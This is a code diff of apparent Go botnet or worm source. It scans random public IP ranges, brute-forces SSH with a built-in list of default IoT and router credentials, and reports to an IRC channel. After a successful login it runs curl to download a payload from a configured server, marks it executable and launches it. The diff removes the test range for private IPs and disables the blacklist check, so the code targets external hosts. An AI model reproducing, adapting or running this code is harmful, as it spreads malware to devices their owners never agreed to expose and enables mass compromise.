@@ -49,12 +49,14 @@ const (
 	cgpn5 = "183." //183.0.0.0 - 183.63.255.255
 	cgpn6 = "124." //124.172.0.0 - 124.175.255.255
 
+	/* For test.
 	//Private ip
 	priv = "192." //192.168.0.0 - 192.168.255.255
 
 	//Blacklist ip
 	bl1 = "192.168.1.1:22"
 	bl2 = "192.168.1.16:22"
+	*/
 )
 
 func GenRange(max, min int) string {
@@ -68,7 +70,7 @@ func ManageIP_range(mainRange, setRange string) string {
 	ipGen = append(ipGen, setRange, ".")
 
 	for i := 0; i < 2; i++ {
-		ipGen = append(ipGen, GenRange(255, 0), ".")
+		ipGen = append(ipGen, GenRange(5, 1), ".")
 	}
 
 	ipGen[len(ipGen)-1] = ""
@@ -101,8 +103,6 @@ func NextIP(ipRange string) string {
 		return ManageIP_range(ipRange, GenRange(63, 0))
 	case cgpn6:
 		return ManageIP_range(ipRange, GenRange(175, 172))
-	case priv:
-		return ManageIP_range(ipRange, GenRange(168, 168))
 	}
 	return ""
 }
@@ -145,7 +145,7 @@ func SSH_Session(ssh_session *ssh.Client, command string) {
 func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 	NetArr := []string{
 		chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
-		cgpn4, cgpn5, cgpn6, priv,
+		cgpn4, cgpn5, cgpn6,
 	}
 
 	/*
@@ -153,7 +153,7 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 		You can add more if you want.
 	*/
 	userList := []string{
-		"admin", "root", "user", "guest", "support", "login", "ubuntu", "pi",
+		"ubuntu", "root", "user", "guest", "support", "login", "pi",
 	}
 
 	passList := []string{
@@ -162,7 +162,7 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 		"juantech", "user", "admin1234", "666666", "klv123", "klv1234", "Zte521", "hi3518",
 		"jvbzd", "7ujMko0vizxv", "7ujMko0admin", "ikwb", "system", "realtek", "00000000", "smcadmin",
 		"123456789", "12345678", "111111", "123123", "1234567890", "login", "supoort", "guest",
-		"ubuntu", "rasberrypi",
+		"rasberrypi",
 	}
 
 	for {
@@ -171,25 +171,27 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 			ptrTarget := &target
 			turnRange := CheckPort(*ptrTarget)
 
-			if target == bl1 || target == bl2 {
-				break
-			}
+			/*
+				if target == bl1 || target == bl2 {
+					break
+				}
+			*/
 
 			if turnRange == "" {
-				IRC_Report(reportIRC, set_chan, target+"SSH not found.")
+				IRC_Report(reportIRC, set_chan, target+" SSH not found.")
 				CheckPort(target)
 			} else {
-				IRC_Report(reportIRC, set_chan, target+"Try to login to "+turnRange)
+				IRC_Report(reportIRC, set_chan, " Try to login to "+turnRange)
 				var logCheck bool
 
 				for i := range userList {
 					for j := range passList {
 						_session, err := ssh.Dial("tcp", turnRange, SSH_Config(userList[i], passList[j]))
 						if err == nil {
-							IRC_Report(reportIRC, set_chan, target+"Login success at "+turnRange)
+							IRC_Report(reportIRC, set_chan, "Login success at "+turnRange)
 							SSH_Session(_session, "curl -o ."+set_payload+" "+set_FTP+" --silent")
 							time.Sleep(10 * time.Second)
-							IRC_Report(reportIRC, set_chan, target+"\"curl\" Success on "+turnRange)
+							IRC_Report(reportIRC, set_chan, "\"curl\" Success on "+turnRange)
 							SSH_Session(_session, "chmod +x ."+set_payload)
 							go SSH_Session(_session, "./."+set_payload+" &")
 							logCheck = true
